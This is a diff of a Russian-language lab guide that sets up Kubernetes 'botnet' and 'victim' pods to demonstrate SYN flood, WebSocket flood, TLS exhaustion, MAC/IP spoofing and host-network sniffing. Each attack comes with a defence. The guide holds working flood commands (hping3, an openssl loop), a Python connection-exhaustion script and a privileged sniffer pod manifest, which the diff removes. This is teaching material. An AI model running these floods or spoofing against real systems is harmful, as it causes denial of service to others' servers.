@@ -148,39 +148,41 @@ send_timeout 5s;
 Для генерации RAW-пакетов (TCP SYN) поду требуются расширенные сетевые привилегии (NET_ADMIN). Создадим файл манифеста bot-syn.yaml
 
 Примените манифест:
-kubectl apply -f bot-syn.yaml
+`kubectl apply -f bot-syn.yaml`
 
 Узнайте прямой IP пода-жертвы
-kubectl get pods -n victim -o wide
+`kubectl get pods -n victim -o wide`
  
 После запуска пода (для проверки запуска используйте kubectl get pods -n botnet), зайдите в него и запустите флуд:
-kubectl exec -it bot-syn -n botnet -- sh
-hping3 -S -p 80 --fast -c 0 <ip_victim>
+`kubectl exec -it bot-syn -n botnet -- sh`
+`hping3 -S -p 80 --fast -c 0 <ip_victim>`
  
 Перейдите в терминал сервера-жертвы и проверьте очередь полуоткрытых соединений:
-netstat -ant | grep SYN_RECV
+`netstat -ant | grep SYN_RECV`
  
 В нашем случае очередь полуоткрытых соединений будет пустой, т.к. SYN Cookies (защита от SYN-флуда) включены в ядре самой ноды Minikube (net.ipv4.tcp_syncookies=1). Ядро просто не выделяет память под сокет и не переводит его в SYN_RECV, а сразу кодирует информацию в TCP Sequence Number
 
 Защита (пример для не пода kubernetes):
 Для защиты на транспортном уровне необходимо настроить параметры стека TCP/IP в ядре Linux. Зайдите в контейнер сервера (он запущен в привилегированном режиме согласно target.yaml) и включите механизм SYN Cookies:
-sysctl -w net.ipv4.tcp_syncookies=1
-sysctl -w net.ipv4.tcp_max_syn_backlog=4096
+`sysctl -w net.ipv4.tcp_syncookies=1`
+`sysctl -w net.ipv4.tcp_max_syn_backlog=4096`
 После этого ядро перестанет выделять память под каждое входящее SYN-соединение до получения ACK, что позволит серверу штатно обрабатывать легитимные запросы даже при переполненной очереди. 
 
-Удалите атакующий под после тестирования: kubectl delete pod bot-syn -n botnet.
+Удалите атакующий под после тестирования: `kubectl delete pod bot-syn -n botnet`
  
 ## 2.5	WebSocket Flood
 Атака на исчерпание соединений через WebSocket (WS) опасна тем, что WS-соединения являются долгоживущими (persistent). Злоумышленник открывает множество сессий и держит их открытыми, исчерпывая лимиты подключений сервера (File Descriptors).
 Для тестирования перенастроим Nginx на поддержку WebSocket. Изменим /etc/nginx/conf.d/default.conf:
+```
 cat << 'EOF' > /etc/nginx/conf.d/default.conf
 # 1. Настройка динамического апгрейда протокола для WebSocket
 map $http_upgrade $connection_upgrade {
     default upgrade;
     ''      close;
 }
-
+```
 **2. Настройка зоны ограничения частоты запросов (HTTP Rate Limiting)**
+```
 limit_req_zone $binary_remote_addr zone=l7_limit:10m rate=5r/s;
 
 server {
@@ -214,16 +216,15 @@ server {
     }
 }
 EOF
-
+```
  
 
-Перезапустите Nginx (nginx -s reload).
+Перезапустите Nginx (`nginx -s reload`).
 
 Запустите атакующий под:
-kubectl run bot-ws -it --rm --image=python:3.9-slim -n botnet -- bash
+`kubectl run bot-ws -it --rm --image=python:3.9-slim -n botnet -- bash`
 Внутри пода установите библиотек и запустите скрипт 
- 
-
+```
 pip install websockets asyncio
 python -c "
 import asyncio, socket
@@ -246,36 +247,34 @@ async def attack(target_ip, port, path, count):
 target_ip = socket.gethostbyname('target-service.victim.svc.cluster.local')
 asyncio.run(attack(target_ip, 80, '/ws', 500))
 "
-
+```
 После этого на жертве через команду 
-netstat -an | grep :80 | grep ESTABLISHED | wc -l 
+`netstat -an | grep :80 | grep ESTABLISHED | wc -l `
 
 вы наглядно увидите, как эти соединения висят в памяти сервера и не закрываются
  
-
-
-
 Защита:
 Защита от этого типа атак базируется на ограничении числа одновременных соединений с одного IP-адреса.
 Добавьте правило iptables, ограничивающее количество одновременных TCP-соединений с одного IP-адреса:
-apk update
-apk add iptables
-iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 10 --connlimit-mask 32 -j REJECT --reject-with tcp-reset
+`apk update`
+`apk add iptables`
+`iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 10 --connlimit-mask 32 -j REJECT --reject-with tcp-reset`
 
-Убедитесь, что правило активное: iptables -L INPUT -v -n
+Убедитесь, что правило активное: `iptables -L INPUT -v -n`
 
 Запустите атаку из ботнета (см. пункт 2.6). Наблюдайте за количеством соединений:
-watch -n 1 'netstat -an | grep :80 | grep ESTABLISHED | wc -l'
+`watch -n 1 'netstat -an | grep :80 | grep ESTABLISHED | wc -l'`
  
 
  
 ## 2.6	SSL/TLS Exhaustion (Исчерпание ресурсов при рукопожатии)
 Атака нацелена на истощение ресурсов CPU сервера. Процесс установки защищенного соединения (TLS Handshake) требует от сервера выполнения ресурсоемких асимметричных криптографических операций.
 Для начала сгенерируем самоподписанный сертификат на сервере-жертве и включим SSL:
-apk add openssl
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/nginx/cert.key -out /etc/nginx/cert.crt -subj "/CN=victim"
+`apk add openssl`
+`openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/nginx/cert.key -out /etc/nginx/cert.crt -subj "/CN=victim"`
  
 Измените /etc/nginx/conf.d/default.conf, добавив слушатель 443 порта:
+```
 server {
     listen 80;
     listen 443 ssl;
@@ -283,65 +282,64 @@ server {
     ssl_certificate_key /etc/nginx/cert.key;
     # ... остальная конфигурация
 }
- 
-Перезапустите Nginx (nginx -s reload).
-
-
+```
+Перезапустите Nginx (`nginx -s reload`).
 
 Запустите атаку с помощью bot-syn пода (п. 2.4). Удалите под и создайте его заново
-kubectl delete pod bot-syn -n botnet
-kubectl apply -f bot-syn.yaml
+`kubectl delete pod bot-syn -n botnet`
+`kubectl apply -f bot-syn.yaml`
 
 Получите ip-адрес жертвы
-kubectl get pods -n victim -o wide
+`kubectl get pods -n victim -o wide`
  
 
 Войдём в под ботнета для атаки
-kubectl exec -it -n botnet bot-syn -- sh   
+`kubectl exec -it -n botnet bot-syn -- sh`
 Внутри пода:
-apk add openssl
+`apk add openssl`
 Эмулируем постоянный перезапуск TLS Handshake без переиспользования сессий
-echo "Q" | openssl s_client -connect <ip-адрес жертвы>:443
+`echo "Q" | openssl s_client -connect <ip-адрес жертвы>:443`
  
 Для создания нагрузки это можно зациклить:
-while true; do echo "Q" | openssl s_client -connect <ip-адрес жертвы>:443 > /dev/null 2>&1; done
-Посмотрите на сервере утилитой top, как растет нагрузка на CPU процессом nginx.
- 
+`while true; do echo "Q" | openssl s_client -connect <ip-адрес жертвы>:443 > /dev/null 2>&1; done`
+Посмотрите на сервере утилитой top, как растет нагрузка на CPU процессом nginx. 
 
 Защита:
 Для снижения вычислительной нагрузки включите кэширование TLS-сессий и ограничьте частоту соединений. В блоке server настройте параметры:
+```
 ssl_session_cache shared:SSL:10m;
 ssl_session_timeout 10m;
- 
+```
 
 Кэширование позволит клиентам повторно использовать симметричные ключи, минуя фазу асимметричного шифрования.
 Для проверки того, что сервер успешно кэширует сессии и экономит ресурсы CPU, используйте утилиту openssl с флагом -reconnect
-openssl s_client -connect target-service.victim.svc.cluster.local:443 -reconnect -no_ign_eof -tls1_2 < /dev/null 2>&1 | grep -E "New|Reused"
- 
- 
+`openssl s_client -connect target-service.victim.svc.cluster.local:443 -reconnect -no_ign_eof -tls1_2 < /dev/null 2>&1 | grep -E "New|Reused"`
+  
 ## 2.7	Подмена адреса источника (Spoofing)
 При спуфинге злоумышленник целенаправленно модифицирует заголовки пакетов на канальном (L2) или сетевом (L3) уровнях, чтобы выдать себя за доверенный узел (например, администратора) или обойти механизмы фильтрации по адресам.
 
 ### 2.7.1.	MAC Spoofing (Подмена на уровне L2)
 Для проведения этой атаки нам потребуются привилегии управления сетью. Зайдем в атакующий под bot-syn (он был заранее запущен с параметром NET_ADMIN):
-kubectl exec -it bot-syn -n botnet -- sh
+`kubectl exec -it bot-syn -n botnet -- sh`
 Проверим текущий MAC-адрес интерфейса пода и изменим его на произвольный (например, 00:11:22:33:44:55) с помощью встроенной утилиты ip:
+```
 ip link show eth0
 ip link set dev eth0 address 00:11:22:33:44:55
 ip link show eth0
- 
+```
+
 На стороне жертвы (target-server) запустите tcpdump с флагом -e (Ethernet)
-tcpdump -e -n -i eth0 icmp or tcp port 80
+`tcpdump -e -n -i eth0 icmp or tcp port 80`
  
 На стороне атакующего (bot-syn) отправьте пакет
-ping -c 3 <IP_ПОДА_ЖЕРТВЫ>
+`ping -c 3 <IP_ПОДА_ЖЕРТВЫ>`
 
 Примечание: В зависимости от используемого в кластере CNI-плагина (например, Flannel или Calico), гипервизор или виртуальный коммутатор ноды может отбросить трафик от неизвестного MAC-адреса. Это наглядно демонстрирует работу защиты на канальном уровне.
  
 ### 2.7.2.	IP Spoofing (Подмена на уровне L3)
 Смоделируем ситуацию: веб-сервер принимает управляющие команды или имеет доступную панель только для доверенного внутреннего IP-адреса администратора (например, 10.99.99.99).
 Находясь внутри пода bot-syn, воспользуемся утилитой hping3 для отправки TCP-запросов (флаг SYN), в которых исходный IP-адрес будет жестко подменен на адрес администратора с помощью ключа -a:
-hping3 -S -p 80 -a 10.99.99.99 -c 5 target-service.victim.svc.cluster.local
+`hping3 -S -p 80 -a 10.99.99.99 -c 5 target-service.victim.svc.cluster.local`
  
 Вы увидите 100% packet loss. Чтобы понять причину, откройте два терминала и запустите tcpdump -n -i eth0 одновременно на атакующем поде и на жертве, а затем повторите атаку.
 Жертва:
@@ -358,19 +356,7 @@ hping3 -S -p 80 -a 10.99.99.99 -c 5 target-service.victim.svc.cluster.local
 В традиционных сетях для перехвата чужого трафика злоумышленники используют атаки типа ARP-Spoofing. В Kubernetes виртуальная сеть (CNI) изолирует сетевые интерфейсы подов , делая классический L2-перехват невозможным.  
 Однако, если администратор кластера допускает ошибку в конфигурации безопасности и позволяет запускать поды с параметром hostNetwork: true, злоумышленник может «вырваться» из изолированного пространства имен пода и получить доступ к корневому сетевому интерфейсу самой ноды кластера (worker node). С этого момента он сможет прослушивать нешифрованный трафик всех подов, запущенных на этом узле.
 Смоделируем ситуацию, при которой злоумышленник развернул в пространстве botnet под с доступом к сети хоста. Создайте файл bot-sniffer.yaml:
-apiVersion: v1
-kind: Pod
-metadata:
-  name: bot-sniffer
-  namespace: botnet
-spec:
-  hostNetwork: true # КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: Подключает под напрямую к сети узла
-  containers:
-  - name: sniffer
-    image: alpine
-    command: ["/bin/sh", "-c", "apk add --no-cache tcpdump curl && sleep 3600"]
-    securityContext:
-      privileged: true # Дает права на прослушивание системных интерфейсов
+
 
 Примените манифест:
 kubectl apply -f bot-sniffer.yaml
